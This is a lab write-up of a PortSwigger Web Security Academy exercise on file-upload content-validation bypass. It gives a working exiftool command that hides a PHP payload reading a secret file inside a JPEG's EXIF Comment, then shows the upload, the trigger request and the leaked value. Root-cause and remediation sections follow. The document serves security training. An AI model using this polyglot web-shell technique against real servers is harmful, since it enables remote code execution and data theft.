# Lab 06 — Remote Code Execution via Polyglot Web Shell Upload

[![Category](https://img.shields.io/badge/Category-File%20Upload-indigo)]()
[![Type](https://img.shields.io/badge/Type-File%20Upload%20-%20Content%20Validation%20Bypass-orange)]()
[![Difficulty](https://img.shields.io/badge/Difficulty-Practitioner-9cf)]()
[![Severity](https://img.shields.io/badge/Severity-Critical-critical)]()
[![Source](https://img.shields.io/badge/Source-PortSwigger%20Web%20Security%20Academy-blue)](https://portswigger.net/web-security/file-upload)

> Part of the [File Upload Labs](./README.md) series — PortSwigger Web Security Academy.

---

## 1. Overview

| Field | Detail |
|---|---|
| **Lab Name** | Remote Code Execution via Polyglot Web Shell Upload |
| **Difficulty** | Practitioner |
| **Vulnerability Class** | File Upload — Content Validation Bypass (Polyglot File) |
| **Weakness (CWE)** | CWE-434: Unrestricted Upload of File with Dangerous Type |
| **Severity** | Critical |
| **Objective** | Upload a basic PHP web shell and use it to exfiltrate the contents of /home/carlos/secret. |

## 2. Summary

The server inspects the uploaded file's real contents to confirm it's a genuine image, defeating simple extension or null-byte tricks. The bypass is to create a genuinely valid image that also embeds PHP code inside a metadata field (the EXIF `Comment` field) that survives the image-validity check, then save it with a `.php` extension so the server executes that embedded code when the file is requested.

## 3. Proof of Concept (PoC)

**Step 1 — Confirm robust validation:**  
Attempt to upload `exploit.php` directly — blocked, even with previously-learned tricks.

**Step 2 — Build the polyglot with ExifTool:**  
Using any genuine `.jpg` image as a base:

```bash
exiftool -Comment="<?php echo 'START ' . file_get_contents('/home/carlos/secret') . ' END'; ?>" input.jpg -o polyglot.php
```

**Step 3 — Upload the polyglot file:**  
Submit `polyglot.php` as your avatar — it's structurally a valid JPEG, so content-based validation passes.

**Step 4 — Trigger execution:**  
Request `GET /files/avatars/polyglot.php`. Use the response search feature to find the `START` string within the binary image data; between `START` and `END` is Carlos's secret, e.g.:

```
START 2B2tlPyJQfJDynyKME5D02Cw0ouydMpZ END
```


## 4. Evidence (Request / Response)

```http
GET /files/avatars/polyglot.php HTTP/1.1

HTTP/1.1 200 OK
<binary JPEG data>...START 2B2tlPyJQfJDynyKME5D02Cw0ouydMpZ END...<binary JPEG data>
```

## 5. Root Cause Analysis

The PHP interpreter scans the entire file for `<?php ... ?>` tags and executes whatever it finds, regardless of where in the file structure they appear. A file can be 100% structurally valid as an image (passing dimension/header/content checks) while still containing executable PHP in a metadata field the image parser doesn't care about.

### Attacker vs. Defender Perspective

- **Attacker view:** When content-based validation blocks simple tricks, build a polyglot file that is simultaneously a valid image and contains executable code in an ignored metadata field.
- **Defender view:** Re-encode and strip metadata from every uploaded image server-side rather than storing the raw uploaded bytes.

## 6. Impact

Full remote code execution, bypassing even relatively robust content-validation defenses.

## 7. Remediation

- Re-encode/re-process all uploaded images server-side (resize or re-save through an image library) rather than storing the raw uploaded bytes — this strips embedded metadata/payloads.
- Strip EXIF and all other metadata from uploaded images as a standard sanitization step.
- Store uploads outside the web root or in a non-executing location as defense in depth.

## 8. References

- [PortSwigger — File Upload Vulnerabilities](https://portswigger.net/web-security/file-upload)
- [OWASP — Unrestricted File Upload](https://owasp.org/www-community/vulnerabilities/Unrestricted_File_Upload)
- [CWE-434: Unrestricted Upload of File with Dangerous Type](https://cwe.mitre.org/data/definitions/434.html)

---

*Writeup produced for educational and authorized lab purposes only (PortSwigger Web Security Academy environment).*
